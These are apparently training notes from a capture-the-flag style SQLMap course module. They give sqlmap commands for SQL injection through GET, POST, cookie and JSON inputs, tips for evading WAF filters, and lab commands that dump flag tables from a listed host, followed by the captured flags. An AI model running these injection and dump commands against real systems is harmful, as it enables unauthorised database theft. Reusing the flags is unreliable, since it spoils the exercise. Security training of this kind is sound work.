# Section 4 — Running SQLMap on an HTTP Request

---

## Input Methods

### GET parameter (most common)
```bash
sqlmap -u "http://TARGET/vuln.php?id=1" --batch
```

### POST parameter
```bash
sqlmap -u "http://TARGET/page.php" --data="id=1&name=test" --batch
# Target specific param only:
sqlmap -u "http://TARGET/page.php" --data="id=1&name=test" -p id --batch
# Or mark with asterisk:
sqlmap -u "http://TARGET/page.php" --data="id=1*&name=test" --batch
```

### Cookie value
```bash
sqlmap -u "http://TARGET/page.php" --cookie="id=1" -p id --level=2 --batch
```
> Cookies are not tested at default level 1 — requires `--level=2` or higher.

### JSON body
```bash
sqlmap -u "http://TARGET/page.php" --data='{"id":1}' --batch
# If UNION has issues with JSON targets:
sqlmap -u "http://TARGET/page.php" --data='{"id":1}' --no-cast --batch
```

### Full HTTP request file (Burp capture)
```bash
# Save Burp request to req.txt, then:
sqlmap -r req.txt --batch
# Mark injection point with * in the file: /?id=* or id=1*
```
Copy as cURL from browser DevTools → replace `curl` with `sqlmap` → works directly.

---

## Useful Request Options

| Option | Purpose |
|--------|---------|
| `--data="param=val"` | POST body |
| `--cookie="key=val"` | Session cookie |
| `-H "Header: val"` | Custom HTTP header |
| `--method=PUT` | Non-GET/POST methods |
| `--random-agent` | Randomize User-Agent (evade WAF signature on sqlmap's default UA) |
| `--mobile` | Imitate smartphone UA |
| `--level=2` | Enables cookie/header testing (default=1 only tests GET/POST params) |
| `-p param` | Test only this parameter |
| `--no-cast` | Fix UNION retrieval issues with JSON/complex bodies |

---

## Lab — Cases 2, 3, 4

**Target:** `154.57.164.72:30732`

### Case 2 — POST parameter (`id`)

```bash
sqlmap -u "http://154.57.164.72:30732/case2.php" \
  --data="id=1" -p id \
  --dbms=mysql --batch --technique=U \
  --dump -T flag2
```

**flag2:** `HTB{700_much_c0n6r475_0n_p057_r3qu357}`

---

### Case 3 — Cookie value (`id=1`)

```bash
sqlmap -u "http://154.57.164.72:30732/case3.php" \
  --cookie="id=1" -p id \
  --dbms=mysql --batch --level=2 \
  --dump -T flag3
```

> `--level=2` required — sqlmap ignores cookies at level 1.

**flag3:** `HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}`

---

### Case 4 — JSON body (`{"id":1}`)

```bash
sqlmap -u "http://154.57.164.72:30732/case4.php" \
  --data='{"id":1}' \
  --dbms=mysql --batch --no-cast \
  --dump -T flag4
```

> `--no-cast` needed — UNION retrieval fails without it on JSON targets.

**flag4:** `HTB{j450n_v00rh335_53nd5_6r475}`

---

## Exam Notes

- Default level 1 only tests GET/POST params — always use `--level=2` when the injectable value is in a cookie or header
- JSON bodies work out of the box — sqlmap auto-detects and offers to process them; just answer Y or use `--batch`
- `--no-cast` resolves silent UNION failures on non-standard body types
- `-r req.txt` is the cleanest approach for complex authenticated requests — copy from Burp, add `*` to mark the injection point
- `--random-agent` should be standard practice — sqlmap's default UA is blocked by many WAFs
